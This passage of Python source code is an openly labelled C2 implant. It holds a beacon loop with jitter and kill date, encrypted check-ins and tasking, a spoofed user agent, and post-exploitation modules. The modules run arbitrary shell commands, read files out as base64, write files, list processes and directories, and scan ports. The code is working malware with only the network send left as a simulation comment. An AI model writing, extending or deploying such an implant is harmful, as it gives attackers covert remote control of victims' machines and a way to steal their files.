    return aes_ctr(ct,key,n)

# === Implant Core ===

class ImplantConfig:
    """Runtime-configurable implant parameters"""
    def __init__(self):
        self.session_key = os.urandom(32)
        self.beacon_interval = 60  # seconds
        self.jitter_pct = 0.3      # 30% jitter
        self.max_retries = 5
        self.kill_date = None       # Epoch timestamp, None = no kill date
        self.c2_urls = []
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.implant_id = hashlib.sha256(os.urandom(16)).hexdigest()[:16]


class TaskQueue:
    """Thread-safe task queue for implant operations"""
    def __init__(self):
        self.pending = []
        self.results = []
        self.lock = threading.Lock()

    def add_task(self, task_id, task_type, args):
        with self.lock:
            self.pending.append({
                'id': task_id,
                'type': task_type,
                'args': args,
                'status': 'pending',
                'created': time.time(),
            })

    def get_next(self):
        with self.lock:
            for task in self.pending:
                if task['status'] == 'pending':
                    task['status'] = 'running'
                    return task
        return None

    def complete_task(self, task_id, result):
        with self.lock:
            for task in self.pending:
                if task['id'] == task_id:
                    task['status'] = 'complete'
                    task['result'] = result
                    self.results.append(task)
                    break

    def get_results(self):
        with self.lock:
            r = list(self.results)
            self.results.clear()
            return r


class CommandModules:
    """Modular post-exploitation commands"""

    @staticmethod
    def cmd_shell(args):
        """Execute shell command"""
        cmd = args.get('cmd', '')
        timeout = args.get('timeout', 30)
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return {'stdout': r.stdout, 'stderr': r.stderr, 'exit': r.returncode}
        except subprocess.TimeoutExpired:
            return {'error': 'timeout', 'timeout': timeout}
        except Exception as e:
            return {'error': str(e)}

    @staticmethod
    def cmd_sysinfo(args):
        """Gather system information"""
        return {
            'hostname': platform.node(),
            'os': platform.system(),
            'os_version': platform.version(),
            'arch': platform.machine(),
            'cpu_count': os.cpu_count(),
            'user': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            'pid': os.getpid(),
            'cwd': os.getcwd(),
            'python': platform.python_version(),
        }

    @staticmethod
    def cmd_download(args):
        """Read file and return contents"""
        path = args.get('path', '')
        try:
            with open(path, 'rb') as f:
                data = f.read()
            return {'path': path, 'size': len(data), 'data': base64.b64encode(data).decode()}
        except Exception as e:
            return {'error': str(e)}

    @staticmethod
    def cmd_upload(args):
        """Write data to file"""
        path = args.get('path', '')
        data = base64.b64decode(args.get('data', ''))
        try:
            with open(path, 'wb') as f:
                f.write(data)
            return {'path': path, 'size': len(data), 'success': True}
        except Exception as e:
            return {'error': str(e)}

    @staticmethod
    def cmd_ps(args):
        """List processes"""
        try:
            if platform.system() == 'Windows':
                r = subprocess.run('tasklist /FO CSV /NH', shell=True, capture_output=True, text=True)
            else:
                r = subprocess.run('ps aux', shell=True, capture_output=True, text=True)
            return {'output': r.stdout}
        except Exception as e:
            return {'error': str(e)}

    @staticmethod
    def cmd_ls(args):
        """List directory contents"""
        path = args.get('path', '.')
        try:
            entries = []
            for entry in os.listdir(path):
                full = os.path.join(path, entry)
                try:
                    st = os.stat(full)
                    entries.append({
                        'name': entry,
                        'size': st.st_size,
                        'is_dir': os.path.isdir(full),
                        'modified': st.st_mtime,
                    })
                except Exception:
                    entries.append({'name': entry, 'error': 'stat failed'})
            return {'path': path, 'entries': entries}
        except Exception as e:
            return {'error': str(e)}

    @staticmethod
    def cmd_portscan(args):
        """Quick TCP port scan"""
        host = args.get('host', '127.0.0.1')
        ports = args.get('ports', [22, 80, 443, 445, 3389, 8080])
        timeout = args.get('timeout', 1)
        results = []
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                if s.connect_ex((host, port)) == 0:
                    results.append({'port': port, 'state': 'open'})
                s.close()
            except Exception:
                pass
        return {'host': host, 'open_ports': results}


class Implant:
    """Core implant with beacon loop and task execution"""

    COMMANDS = {
        'shell': CommandModules.cmd_shell,
        'sysinfo': CommandModules.cmd_sysinfo,
        'download': CommandModules.cmd_download,
        'upload': CommandModules.cmd_upload,
        'ps': CommandModules.cmd_ps,
        'ls': CommandModules.cmd_ls,
        'portscan': CommandModules.cmd_portscan,
    }

    def __init__(self, config):
        self.config = config
        self.queue = TaskQueue()
        self.running = True
        self.beacon_count = 0

    def _jittered_sleep(self):
        """Sleep with jitter"""
        import random
        base = self.config.beacon_interval
        jitter = base * self.config.jitter_pct
        sleep_time = base + random.uniform(-jitter, jitter)
        time.sleep(max(1, sleep_time))

    def _check_kill_date(self):
        """Self-terminate if kill date has passed"""
        if self.config.kill_date and time.time() > self.config.kill_date:
            self.running = False
            return True
        return False

    def execute_task(self, task):
        """Execute a single task"""
        cmd_type = task['type']
        handler = self.COMMANDS.get(cmd_type)
        if handler:
            try:
                result = handler(task['args'])
            except Exception as e:
                result = {'error': str(e)}
        else:
            result = {'error': 'unknown command: %s' % cmd_type}
        self.queue.complete_task(task['id'], result)
        return result

    def build_checkin(self):
        """Build encrypted check-in message"""
        info = {
            'id': self.config.implant_id,
            'beacon': self.beacon_count,
            'results': self.queue.get_results(),
            'timestamp': time.time(),
        }
        payload = json.dumps(info).encode()
        return aes_enc(payload, self.config.session_key)

    def process_tasking(self, encrypted_data):
        """Process encrypted tasking from C2"""
        try:
            data = aes_dec(encrypted_data, self.config.session_key)
            tasks = json.loads(data)
            if isinstance(tasks, list):
                for t in tasks:
                    self.queue.add_task(t['id'], t['type'], t.get('args', {}))
            return len(tasks) if isinstance(tasks, list) else 0
        except Exception:
            return 0

    def beacon_once(self):
        """Single beacon cycle: check in, get tasks, execute"""
        self.beacon_count += 1
        # Build check-in
        checkin = self.build_checkin()
        # In real deployment: send checkin to C2, receive tasking
        # Here: simulate task processing
        task = self.queue.get_next()
        if task:
            self.execute_task(task)
        return checkin


